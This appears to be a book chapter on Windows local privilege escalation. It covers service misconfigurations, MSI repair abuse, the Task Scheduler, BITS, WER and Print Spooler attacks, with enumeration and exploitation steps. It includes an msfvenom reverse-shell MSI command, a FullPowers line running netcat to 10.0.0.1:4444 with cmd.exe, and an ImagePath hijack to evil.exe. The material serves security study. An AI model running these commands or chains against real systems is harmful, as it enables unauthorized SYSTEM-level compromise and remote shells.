# Chapter 07 — Windows Services, Installers & Updaters
## Local Privilege Escalation Through System Infrastructure

---

## 1. Service Control Manager (SCM) Architecture

### 1.1 What the SCM Is

The Service Control Manager (`services.exe`) is the first non-kernel process launched by `wininit.exe` during boot. It is responsible for the complete lifecycle of all Windows services: creation, ordering, dependency resolution, startup, monitoring, and shutdown. The SCM exposes an RPC interface (`svcctl`) consumed by `sc.exe`, PowerShell `*-Service` cmdlets, and any application that calls the Win32 service APIs (`OpenSCManager`, `OpenService`, `ChangeServiceConfig`, etc.).

Every service registration is stored under `HKLM\SYSTEM\CurrentControlSet\Services\<name>`. The critical subkeys are:
- `ImagePath` — the binary path, including command-line arguments
- `ObjectName` — the account under which the service runs
- `Start` — numeric startup type (0=Boot, 1=System, 2=Automatic, 3=Manual, 4=Disabled)
- `Type` — service type bitmask

The SCM maintains an in-memory service database and uses an event-based notification mechanism to communicate state changes between the SCM process and the service's service-control handler thread (registered via `RegisterServiceCtrlHandler`).

### 1.2 Service Types

| Type Value | Symbolic Name | Description |
|------------|--------------|-------------|
| 0x01 | `SERVICE_KERNEL_DRIVER` | Kernel-mode driver |
| 0x02 | `SERVICE_FILE_SYSTEM_DRIVER` | File system driver |
| 0x10 | `SERVICE_WIN32_OWN_PROCESS` | Service in its own process |
| 0x20 | `SERVICE_WIN32_SHARE_PROCESS` | Service sharing a `svchost.exe` process with others |
| 0x50 | `SERVICE_USER_OWN_PROCESS` | User-mode service in own process |
| 0x60 | `SERVICE_USER_SHARE_PROCESS` | User-mode service sharing process |
| 0x100 | `SERVICE_INTERACTIVE_PROCESS` | Can interact with desktop (deprecated) |

`SERVICE_WIN32_SHARE_PROCESS` is the dominant type for Microsoft services. Multiple services coexist inside a single `svchost.exe` instance, sharing the process token but each with its own DLL (`Parameters\ServiceDll`) and thread pool. This architecture means a vulnerability in any DLL loaded by a shared `svchost.exe` instance potentially affects all co-resident services.

### 1.3 Service Account Contexts

The choice of `ObjectName` determines the security context in which the service binary runs. From an attacker's perspective, understanding these accounts is prerequisite to understanding privilege escalation paths.

**LocalSystem (`.` / `NT AUTHORITY\SYSTEM`):**
- The most privileged built-in service account
- Has `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeTcbPrivilege`, `SeDebugPrivilege`, and virtually all system privileges
- Has full access to the local machine including the SAM database
- On domain-joined machines, authenticates to the network as `MACHINENAME$`
- Runs the SCM itself, WMI, Task Scheduler, Windows Installer, Print Spooler, and most Windows core services
- **Attack significance:** Any code execution inside a LocalSystem process is immediately SYSTEM. Any file operation performed by a LocalSystem service without proper path validation is a potential LPE primitive.

**LocalService (`NT AUTHORITY\LOCAL SERVICE`):**
- Limited subset of privileges compared to LocalSystem
- Has `SeImpersonatePrivilege` but NOT `SeAssignPrimaryTokenPrivilege`
- No network credentials — presents as anonymous on the network
- Access to machine-level resources restricted compared to LocalSystem
- Services: AudioSrv, EventLog (in share mode), CertPropSvc
- **Attack significance:** `SeImpersonatePrivilege` is present. This means LocalService processes can be escalated to SYSTEM via PrintSpoofer/GodPotato-class techniques. However, some specific privileges (e.g., `SeAuditPrivilege`) may be missing from the token. The `FullPowers` tool (see §6.4) recovers these.

**NetworkService (`NT AUTHORITY\NETWORK SERVICE`):**
- Similar to LocalService but presents machine credentials (`MACHINENAME$`) on the network
- Has `SeImpersonatePrivilege` but NOT `SeAssignPrimaryTokenPrivilege`
- Services: DNS client, BITS, Remote Procedure Call, SQL Server Express
- **Attack significance:** Same escalation paths as LocalService. NetworkService-level code execution inside IIS (`W3SVC`), SQL Server, or MSSQL Agent is a common post-exploitation starting point.

**Virtual Accounts (`NT SERVICE\<ServiceName>`):**
- Introduced in Windows Server 2008 R2 / Windows 7
- Per-service isolated accounts that do not have a password manageable externally
- Authenticate to network as `MACHINENAME$`
- Privileges are limited to what the service requires
- **Attack significance:** If the virtual account has `SeImpersonatePrivilege` (it often does), Potato-class escalation still applies.

**Managed Service Accounts (MSA) and Group Managed Service Accounts (gMSA):**
- Domain-based accounts with automatic password management
- gMSA is the preferred modern pattern for services needing domain access
- Passwords managed by the DC, not the service itself
- **Attack significance:** Lower attack surface for credential theft; the password hash is not stored locally in a form easily dumped. However, if the service process has `SeImpersonatePrivilege`, token-based escalation still works.

**Privilege Matrix:**

| Account | SeImpersonate | SeAssignPrimaryToken | SeTcbPrivilege | Network Auth |
|---------|:---:|:---:|:---:|:---:|
| LocalSystem | ✓ | ✓ | ✓ | MACHINENAME$ |
| LocalService | ✓ | ✗ | ✗ | Anonymous |
| NetworkService | ✓ | ✗ | ✗ | MACHINENAME$ |
| IIS AppPool | ✓ | ✗ | ✗ | MACHINENAME$ |
| Virtual Account | ✓ | ✗ | ✗ | MACHINENAME$ |
| Custom (restricted) | Varies | ✗ | ✗ | Varies |

---

## 2. Service Configuration Weaknesses

### 2.1 Binary Path ACL (Weak Service Binary Permissions)

**Root cause:** The service binary (`ImagePath`) or its parent directory has a DACL that grants write access to a low-privilege user.

**How to find:**
```powershell
# Using PrivescCheck (preferred)
Invoke-PrivescCheck -Extended

# Manual — check binary ACL
icacls "C:\Program Files\VendorApp\service.exe"
# Look for: BUILTIN\Users:(M), Everyone:(W), INTERACTIVE:(W)

# PowerSploit
Get-ModifiableServiceFile
```

**Exploitation:**
1. Identify the service binary with write permission
2. Back up the original (recommended for safety in real engagements)
3. Replace with a payload binary having the same name
4. Trigger a service restart: `sc stop <name> && sc start <name>` (if stop/start permission exists), or wait for restart/reboot
5. The payload executes under the service's account (LocalSystem in most cases)

**Note:** Even if you can't restart the service, planting the binary and waiting for a system reboot is sufficient — services with `Start=2` (Automatic) restart at boot.

### 2.2 Service Registry Key ACL

**Root cause:** The registry key `HKLM\SYSTEM\CurrentControlSet\Services\<name>` has write access for low-privilege users, allowing modification of `ImagePath` or `ObjectName`.

**Notable real-world example:** The RpcEptMapper and DNSCache service keys on unpatched Windows 10/Server 2019 were writable by low-privilege users. itm4n exploited this by writing a `Parameters\ServiceDll` value pointing to a malicious DLL, causing the SYSTEM-context service host to load it (CVE-2019-0943 pattern).

**How to find:**
```powershell
$services = Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services"
foreach ($svc in $services) {
    $acl = Get-Acl $svc.PSPath
    $acl.Access | Where-Object {
        ($_.IdentityReference -match "Users|Authenticated Users|Everyone") -and
        ($_.RegistryRights -match "Write|FullControl|SetValue")
    } | ForEach-Object { "$($svc.Name) — $($_.IdentityReference) — $($_.RegistryRights)" }
}
```

**Exploitation pattern:**
```
1. Write to ImagePath: reg add HKLM\...\Services\Vulnerable /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\attacker\evil.exe"
2. Restart service (or wait)
3. evil.exe runs as service account (often SYSTEM)
```

The `Parameters\ServiceDll` variant is more surgical — the service host process (`svchost.exe`) continues running normally for other co-resident services, only loading the malicious DLL.

### 2.3 Unquoted Service Paths

**Root cause:** A service binary path contains spaces and is not enclosed in quotation marks. The Windows `CreateProcess` call resolves the unquoted path by trying each space-separated segment as an executable:

```
Path: C:\Program Files\Vendor App\service binary.exe
Attempts:
  1. C:\Program.exe
  2. C:\Program Files\Vendor.exe
  3. C:\Program Files\Vendor App\service.exe  ← actual
  4. C:\Program Files\Vendor App\service binary.exe
```

If any of these paths is in a directory writable by the attacker, a binary planted there executes as the service account.

**How to find:**
```cmd
wmic service get name,pathname,startname,startmode | findstr /v "C:\\Windows"
:: Look for paths with spaces but no quotes around the full path
```
```powershell
# PrivescCheck covers this
Invoke-PrivescCheck -Extended | Where-Object { $_.Category -eq "Services > Binary Path" }
```

**Prevalence:** Extremely common in third-party enterprise software (SIEM agents, endpoint management tools, AV products). The root directory `C:\` is sometimes writable on misconfigured systems, making `C:\Program.exe` the attack vector.

### 2.4 DLL Search Order Hijacking in Services

When a service binary (or a DLL it loads) calls `LoadLibrary("example.dll")` without a full path, the Windows loader searches in order:
1. **KnownDLLs** — `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` — DLLs listed here are loaded from `\KnownDlls` object directory directly; cannot be hijacked
2. **DLL Redirection folder** — `<exedir>\<exename>.local\`
3. **Application manifest SxS assembly**
4. **Already-loaded modules** (DLL cache in process)
5. **System directory** — `C:\Windows\System32\`
6. **16-bit system directory** — `C:\Windows\System\`
7. **Windows directory** — `C:\Windows\`
8. **Current working directory** — dangerous if attacker-controlled
9. **PATH environment variable directories** — each directory in `%PATH%` in order

**Attack surface categories:**

*Missing DLL hijack:* Service attempts to load a DLL that doesn't exist in System32 or elsewhere. If the first writable PATH entry exists before the expected location, an attacker-placed DLL is loaded. Detect with Process Monitor filter: `Result=NAME NOT FOUND`, `Path ends with .dll`, `Process Name=<privileged binary>`.

*Phantom DLL:* A DLL that Windows expects in System32 but was removed or never existed. Historical examples include `wlbsctrl.dll` (IKEEXT service) and `TSMSISrv.dll` (Terminal Services).

*PATH directory weak permissions:* `icacls` each directory in `%PATH%`. Any user-writable directory in the PATH allows DLL planting for any process that doesn't use `LOAD_LIBRARY_SEARCH_SYSTEM32`.

*Application directory:* If the service binary is in a directory writable by the attacker (e.g., `C:\ProgramData\VendorName\`), any DLL loaded by the service from the same directory can be replaced.

**Bypass of `SafeDllSearchMode`:** Even with `SafeDllSearchMode=1` (moves current directory search to position 8 instead of 4), if the PATH contains a writable directory before System32, hijacking remains possible.

---

## 3. Windows Installer (MSI) Architecture

### 3.1 MSI Service Internals

The Windows Installer service (`msiserver`, implemented in `msi.dll` and `msiexec.exe`) is responsible for installing, repairing, patching, and removing software packages. It runs as **LocalSystem** for system-scope (per-machine) installations.

**Installation phases and their security context:**

| Phase | Security Context | Network Access | Key Operations |
|-------|:---:|:---:|:---|
| Immediate | User/Admin | Yes | Script building, resource gathering |
| Deferred (elevated) | SYSTEM | No | Actual file copy, registry write |
| Rollback | SYSTEM | No | Undo deferred actions |
| Commit | User/Admin | Yes | Final commit after deferred |
| Custom Action Type 1 | SYSTEM (if deferred) | No | DLL/EXE in elevated context |
| Custom Action Type 2 | User | Yes | Script/DLL in user context |

The critical insight: **deferred actions run as SYSTEM**. All privileged file system operations during installation happen in this phase. Any manipulation of paths used during deferred execution can achieve SYSTEM code execution.

**Cached MSI packages:**
When a product is installed with per-machine scope, the MSI package is cached in `C:\Windows\Installer\{GUID}.msi`. This file is owned by SYSTEM but readable by all users. The product remains **advertised** — meaning it can be repaired later without a new installation source.

**Advertised installs and the repair vector:**
An advertised install is a product registered in the system's installer database that can be self-repaired. The repair is triggered by `msiexec /fa {ProductCode}` (or `/f` with various flags), which re-runs deferred actions as SYSTEM to restore the product to its advertised state.

### 3.2 InstallerFileTakeOver — Step-by-Step

Researcher Abdelhamid Naceri (klinix5/halov) discovered that the MSI repair mechanism can be redirected via NTFS junction manipulation to achieve an arbitrary file move primitive.

**Prerequisites:** Any standard local user account. No special privileges required.

**Step-by-step exploitation:**

```
Step 1: Locate an advertised MSI product
   wmic product get name,identifyingnumber,installlocation
   → Find a product with cached MSI and repair capability

Step 2: Identify the cached MSI file
   dir C:\Windows\Installer\*.msi
   → Use msiinfo/orca.exe to match product GUID to cached file

Step 3: Understand what the repair will do
   Open the MSI in Orca.exe (Microsoft SDK tool)
   → Look at File table: which files are moved during repair?
   → Identify staging path (usually under %TEMP% or component temp directory)

Step 4: Set up the junction redirect
   Create attacker directory: mkdir C:\Temp\Stage
   Stage the payload DLL there: copy evil.dll C:\Temp\Stage\target.dll
   
Step 5: Trigger the repair
   msiexec /fav {PRODUCT-CODE-GUID}
   
Step 6: During repair, before the SYSTEM file move completes:
   The MSI service moves files from staging area to install location
   Using junction at the staging path → redirect destination
   The privileged file move goes to attacker-chosen high-value path
   
   Example redirect:
   Junction: C:\ProgramData\Vendor\App\  →  C:\Windows\System32\
   Result: MSI repair copies attacker DLL to C:\Windows\System32\target.dll
   
Step 7: Leverage the displaced file
   Option A: Wait for a service to auto-load the DLL (DLL search order)
   Option B: Use the planted DLL path as a write primitive to trigger code execution
   Option C: Overwrite a service binary binary or config file
```

**The underlying mechanism:** The SYSTEM process (msiexec.exe deferred phase) uses `MoveFileEx` or `NtSetInformationFile` with `FileRenameInformation` to move staged files to their final locations. It does NOT check `OBJ_DONT_REPARSE`, so junction traversal works. The attacker's junction swaps the destination directory from the legitimate install path to any SYSTEM-writable path (including `C:\Windows\System32\`).

**Naceri's bypass context:** CVE-2021-41379 was issued for an MSI privilege escalation. The patch applied incorrect ACLs. Naceri published `InstallerFileTakeOver` as a bypass that worked on the patched system, demonstrating the fundamental architectural issue with repair-as-SYSTEM.

### 3.3 AlwaysInstallElevated

**Configuration:**
- `HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1`
- `HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1`

**Both keys must be set.** When both are present, the Windows Installer service elevates every MSI installation regardless of the user's privileges. An attacker with a custom-crafted MSI can execute arbitrary code as SYSTEM.

**Detection:**
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Exploitation:**
Create a minimal MSI with a Type 1 deferred custom action that executes a payload:
```
# Using msfvenom or manual creation:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=... LPORT=... -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```
The custom action runs as SYSTEM due to the policy setting.

**Prevalence:** Common in enterprise environments where IT deploys software without requiring admin credentials per-deployment. Often set via Group Policy without understanding the security implications.

### 3.4 MSI Custom Actions — Security Detail

Custom Actions are code injections points within MSI packages. Their execution context determines their privilege level:

**Type 1 — DLL function:** Calls a function in a DLL specified in the `Source` column. If deferred (sequence ≥ 1000), runs as SYSTEM.

**Type 2 — EXE:** Calls an executable with specified arguments. Deferred = SYSTEM context.

**Type 34 — Directory-level EXE:** Runs an EXE from the installed location. If the installed location is writable by the attacker, this is exploitable.

**Attack angle for research:** When auditing third-party MSI packages:
1. Open package in Orca.exe
2. Examine `CustomAction` table for Type 1/2/34 entries
3. Check `InstallExecuteSequence` for deferred sequence numbers
4. If the DLL in `Source` column is loaded from an attacker-writable path during repair, DLL hijack is possible

---

## 4. Task Scheduler as LPE Vector

### 4.1 Architecture and Attack Surface

The Task Scheduler service (`Schedule.exe`) runs as LocalSystem and manages all scheduled tasks. It exposes:
- An ALPC port interface (`\RPC Control\ITaskSchedulerService`) for local administration
- A COM interface (`ITaskService` / `ITaskScheduler`)
- An RPC-over-named-pipe interface accessible remotely

Tasks are stored in `C:\Windows\System32\Tasks\` (XML files) and in the registry under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks`.

**Why the Task Scheduler is high-value:** Jobs run in the security context of their configured principal. Tasks configured as `NT AUTHORITY\SYSTEM` execute with full SYSTEM privileges. Tasks with `RunLevel=Highest` run elevated.

### 4.2 SandboxEscaper CVE Pattern (ALPC + Job File Race)

Between 2018 and 2019, the researcher known as SandboxEscaper published multiple Windows LPE exploits targeting the Task Scheduler as 0-days. The techniques illustrate the recurring patterns.

**CVE-2018-8440 (Task Scheduler ALPC Interface):**
The Task Scheduler's ALPC interface method `SchRpcSetSecurity` set the DACL on a task's job file (`.job` format, used in legacy compatibility mode). The bug: the service improperly propagated the DACL to the task file's location without validating that the path hadn't been redirected. By timing a junction swap, an attacker could make the SYSTEM-level `SchRpcSetSecurity` call set an arbitrary DACL on any file in the filesystem.

**Result:** Arbitrary DACL write → change ACL on any file to grant user full control → read SAM hive, modify service binary, etc.

**CVE-2019-1069 (Task Scheduler popen() Race):**
The Task Scheduler used `popen()` for logging task output. The race: between checking the log path and opening the file for writing, a junction could be injected to redirect the write to an arbitrary path. The privileged write became an arbitrary file write primitive.

**What these teach architecturally:**
- The ALPC interface itself is an attack surface separate from the task binary
- Privileged services that handle user-controlled paths (even log paths) are dangerous
- The combination of ALPC interface access + SYSTEM execution context + path-following file operations is a recurring vulnerability class

### 4.3 Scheduled Task Binary Hijacking

Beyond the 0-day patterns, scheduled tasks represent an ongoing low-tech attack surface:

1. **Task runs binary from writable directory:** If a SYSTEM-privileged task runs `C:\ProgramData\Vendor\updater.exe` and that directory is writable, replace the binary.
2. **Task DLL hijack:** The task binary loads DLLs from an attacker-writable directory.
3. **XML DACL misconfiguration:** Task XML files in `C:\Windows\System32\Tasks\` are sometimes writable by non-admin users due to misconfigured ACLs inherited from vendor installers.

**Enumeration:**
```powershell
Get-ScheduledTask | Where-Object {
    $_.Principal.RunLevel -eq "Highest" -or 
    $_.Principal.UserId -in @("SYSTEM", "NT AUTHORITY\SYSTEM")
} | Select-Object TaskName, @{N="Binary";E={$_.Actions.Execute}} |
    ForEach-Object {
        if ($_.Binary) { $acl = icacls $_.Binary 2>&1; "$($_.TaskName): $($_.Binary)" }
    }
```

---

## 5. BITS — Background Intelligent Transfer Service (CVE-2020-0787)

### 5.1 BITS Architecture

BITS (Background Intelligent Transfer Service) is a system service running as **LocalSystem** that manages asynchronous file transfers. It is used by Windows Update, Windows Defender, and numerous third-party applications via the `IBackgroundCopyManager` COM interface.

BITS jobs persist across reboots and can transfer files to/from network shares or HTTP/HTTPS endpoints. Locally, BITS can download files and write them to specified local paths — as SYSTEM.

### 5.2 CVE-2020-0787 — Missing Impersonation + Junction

**Researcher:** itm4n (Clément Labro)

**Root cause:** When a BITS job was configured to download a file to a local path, the BITS service performed file operations as SYSTEM without impersonating the calling user. This violates the principle that privileged services should impersonate the caller for file operations initiated on the caller's behalf.

**Attack structure:**
```
1. Create a BITS job as low-privilege user:
   IBackgroundCopyManager::CreateJob()
   job->AddFile(src_url, "C:\Legitimate\Path\file.txt")
   job->Resume()

2. BITS service (running as SYSTEM) creates the destination file
   at "C:\Legitimate\Path\file.txt"

3. Before BITS completes the file write:
   Replace "C:\Legitimate\Path\" with a junction pointing to
   "C:\Windows\System32\"

4. BITS continues writing to the junction target:
   C:\Windows\System32\file.txt — arbitrary file write as SYSTEM

5. Contents of the written file = attacker-controlled (the source URL/content)

6. Plant a DLL (e.g., WindowsCodecs.dll if missing from System32,
   or target a DLL loaded by a SYSTEM service on restart)
```

**The missing impersonation:** The correct fix would have been for BITS to call `ImpersonateClient()` before opening the destination file handle. Without impersonation, the file creation check uses the SYSTEM token instead of the caller's token — allowing writes to paths the caller cannot write.

**Mitigation applied in patch:** BITS now impersonates the job owner before performing local file operations.

---

## 6. Windows Error Reporting (WER) as File Write Primitive

### 6.1 WER Architecture

Windows Error Reporting (`WerSvc`, `WerFault.exe`) runs in SYSTEM context (or elevated context for interactive crash handling) and writes crash dump files to:
- `C:\ProgramData\Microsoft\Windows\WER\ReportQueue\`
- `C:\ProgramData\Microsoft\Windows\WER\ReportArchive\`

`WerFault.exe` is launched as an elevated helper by the kernel crash handler (`WerKernel`) when an application crashes. The crash dump path is derived from process metadata and registry configuration.

### 6.2 Exploit Pattern

The WER crash dump write path can be influenced through:
1. **Junction at report directory:** If the `ReportQueue` or `ReportArchive` directory is replaced with a junction before WER writes the dump, the dump lands in the junction target.
2. **Attacker-controlled process name:** The dump file name incorporates the process name. If a process named strategically and crashed at the right moment, the dump filename approximates a target DLL name.
3. **Oplock + junction (BaitAndSwitch):** Set oplock on a file inside the WER write path. When WER accesses it (opening for writing), the oplock fires. Swap the junction. Release oplock. WER writes to the junction target.

**Constraints:**  
- The dump content (a minidump or full dump) is not arbitrary binary — it is a valid dump structure. This limits direct DLL planting to scenarios where only file existence matters (e.g., sentinel files checked by a service) rather than content.
- However, **arbitrary file creation** (even with non-arbitrary content) can still enable LPE via directory traversal tricks if a SYSTEM service later processes the file by name.

WER is documented in Forshaw's symbolic link research as an example of a privileged write primitive requiring careful exploitation chaining.

---

## 7. Print Spooler Architecture and Attack Surface

### 7.1 Why SpoolSV Runs as SYSTEM

The Print Spooler service (`spoolsv.exe`) runs as **LocalSystem** for fundamental architectural reasons:
- It manages printer drivers, which are kernel-mode components (`*.sys` files in `C:\Windows\System32\spool\drivers\`)
- Installing a printer driver requires kernel-mode driver installation, which requires SYSTEM privileges
- The spooler manages job queues and spool files in `C:\Windows\System32\spool\PRINTERS\` — a SYSTEM-owned directory
- It handles cross-session printing (allows services in session 0 to print to user-session printers)

The spooler exposes named pipe endpoints:
- `\\.\pipe\spoolss` — local client connection pipe
- RPC over SMB/TCP for remote administration

### 7.2 AddPrinterDriverEx DLL Load

The RPC method `RpcAddPrinterDriverEx` (part of MS-RPRN) installs a printer driver. The driver is specified by the caller and must be in a path accessible by the spooler. When the spooler installs the driver, it loads the driver DLL as SYSTEM.

**PrintNightmare (CVE-2021-1675 / CVE-2021-34527):**
- **LPE vector:** Any user with `SeLoadDriverPrivilege` (or even just by calling `AddPrinterDriverEx` with the right flags) could cause the spooler to load an attacker-controlled DLL as SYSTEM from a UNC path or local path.
- **RCE vector:** Remote authenticated domain users could trigger the same on an exposed print server.

The core issue: `RpcAddPrinterDriverEx` did not properly validate that the DLL paths were restricted to trusted SYSTEM-only directories.

### 7.3 PrintSpoofer — Named Pipe Impersonation

**Researcher:** itm4n (Clément Labro)

**Mechanism:**
The Print Spooler creates named pipes for communication with print clients. When a client calls `OpenPrinter` with `\\.\pipe\spoolss`, the spooler creates a callback pipe named `\\.\pipe\spoolss\<SessionID>.<random>` and connects to it. By creating a fake server that mimics this interaction, an attacker with `SeImpersonatePrivilege` can intercept the spooler's connection.

**Exploitation sequence:**
```
1. Attacker (as NetworkService/LocalService/IIS AppPool) 
   confirms SeImpersonatePrivilege:
   whoami /priv

2. Create a named pipe with a crafted name that the spooler will connect to:
   CreateNamedPipe("\\.\pipe\spoolss\<session>.<random>", PIPE_ACCESS_DUPLEX, ...)

3. Call OpenPrinter("\\LOCALHOST\,XpsPort:") or similar to trigger the spooler
   to make an outbound connection to the attacker pipe

4. Spooler (running as SYSTEM) connects to the attacker-controlled pipe

5. ImpersonateNamedPipeClient(hPipe)
   → Current thread now runs with SYSTEM token

6. DuplicateTokenEx(hImpersonation, TOKEN_ALL_ACCESS, ..., TokenPrimary, &hPrimary)
7. CreateProcessWithTokenW(hPrimary, ..., "cmd.exe", ...)
   → SYSTEM shell
```

**Why it bypasses DCOM restrictions:** Unlike Juicy Potato/JuicyPotato (which used DCOM activation over loopback — restricted in Windows 10 1809+), PrintSpoofer uses the Spooler's named pipe mechanism which is a different code path entirely.

**Mitigation:** Disabling the Print Spooler service (`Stop-Service Spooler; Set-Service Spooler -StartupType Disabled`) eliminates both PrintSpoofer and PrintNightmare on systems that don't need printing.

---

## 8. FullPowers — Privilege Restoration for LocalService/NetworkService

### 8.1 The Missing Privileges Problem

When a service process runs as LocalService or NetworkService, the process token contains a **reduced set of privileges** compared to what these accounts theoretically have. This is by design: the SCM strips some privileges from service tokens based on the service's privilege set configuration.

The critical implication: many documented Potato-class exploits require not just `SeImpersonatePrivilege` but also `SeAssignPrimaryTokenPrivilege` to call `CreateProcessAsUser`. If the latter is missing from the token, some exploitation paths break.

**Additionally:** Services that receive connections from clients inherit a further-reduced impersonation token. IIS worker processes, for example, may not have the full set of privileges that `IIS AppPool\DefaultAppPool` theoretically possesses.

### 8.2 How FullPowers Works

itm4n's `FullPowers` tool exploits the fact that the SCM re-grants full service account privileges when a service is started through a proper service control mechanism. By spawning a new scheduled task running as the same account, the task receives the full token for that account.

**Mechanism:**
```
1. FullPowers.exe identifies the current service account (e.g., NETWORK SERVICE)
2. Creates a temporary scheduled task configured to run as NETWORK SERVICE
3. Task action: spawn a process and inject the full token back to the caller
4. The task receives a full NETWORK SERVICE token (with SeImpersonate + other privileges)
5. FullPowers duplicates this token and creates a shell under it
```

The key insight: when the Task Scheduler creates a process for a task, it obtains the account's token fresh from the LSA, bypassing the privilege stripping that the SCM performs.

**Use case:**
```cmd
:: From restricted service shell, recover full privileges:
FullPowers.exe -c "C:\Windows\Temp\nc.exe 10.0.0.1 4444 -e cmd.exe" -z
```

---

## 9. Component Attack Surface Comparison

| Component | Account | Key Technique | Privilege Needed to Trigger | CVE Reference |
|-----------|:-------:|:---:|:---:|:---|
| Task Scheduler | SYSTEM | ALPC DACL write, job file race | Any user | CVE-2018-8440, CVE-2019-1069 |
| Windows Installer | LocalSystem | Repair junction redirect | Any user | InstallerFileTakeOver, CVE-2021-41379 |
| BITS | LocalSystem | Junction + missing impersonation | Any user | CVE-2020-0787 |
| Print Spooler | LocalSystem | AddPrinterDriverEx DLL load | Authenticated user | CVE-2021-1675, CVE-2021-34527 |
| Print Spooler | LocalSystem | Named pipe impersonation | SeImpersonate | PrintSpoofer (no CVE) |
| Task Scheduler | SYSTEM | COM coercion (GodPotato) | SeImpersonate | No CVE |
| WER | LocalSystem | Crash dump path junction | Any user | Forshaw research |
| DiagTrack | LocalSystem | File write race (junction) | Any user | CVE-2020-0668 (service tracing) |
| Service binary | Service acct | Binary ACL weak write | Write on binary | Classic technique |
| Service registry | Service acct | ImagePath modification | Write on reg key | itm4n RpcEptMapper |

---

## References

[R-1] Windows Installer Portal — Microsoft — https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-portal

[R-2] InstallerFileTakeOver — Abdelhamid Naceri (klinix5) — https://github.com/klinix5/InstallerFileTakeOver

[R-3] CVE-2020-0668 — Windows Service Tracing EoP — itm4n — https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/

[R-4] CVE-2020-0787 — Windows BITS EoP — itm4n — https://itm4n.github.io/cve-2020-0787-windows-bits-eop/

[R-5] PrivescCheck — itm4n — https://github.com/itm4n/PrivescCheck

[R-6] PrintSpoofer: Abusing Impersonation Privileges — itm4n — https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/

[R-7] Recovering the Full Privileges of a LocalService/NetworkService Token — itm4n — https://itm4n.github.io/localservice-privileges/
